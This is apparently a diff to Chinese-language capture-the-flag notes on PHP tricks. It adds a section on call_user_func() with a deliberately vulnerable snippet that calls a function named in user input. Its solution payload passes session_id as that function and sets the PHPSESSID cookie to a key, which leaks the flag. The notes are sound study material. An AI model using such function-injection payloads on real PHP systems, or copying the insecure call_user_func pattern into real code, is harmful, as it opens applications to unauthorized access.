@@ -323,3 +323,28 @@ Payload：?f1=_&f2=get_defined_vars
 因此，在表达式 `a || b && c` 中，会先计算 `b && c`，然后根据结果再与 `a` 进行逻辑或运算。
 
 
+
+^
+## **call_user_func()特性**
+正常call_user_func(函数名,参数);
+正常call_user_func(函数名); //无参函数
+
+场景1：
+```
+    session_start();
+    $m=$_POST[m];
+    $key = '372619038';
+    $content = call_user_func($m);
+    if(stripos($content, $key)!==FALSE){
+        echo $flag;
+}
+```
+这里需要传递一个无参函数，还要能返回值输出包含372619038字符串的。
+使用session_id，session_id做函数调用返回的是sessionid值，我们可以在请求中定义。
+```
+?m=session_id
+Cookie: PHPSESSID=372619038;
+```
+
+
+
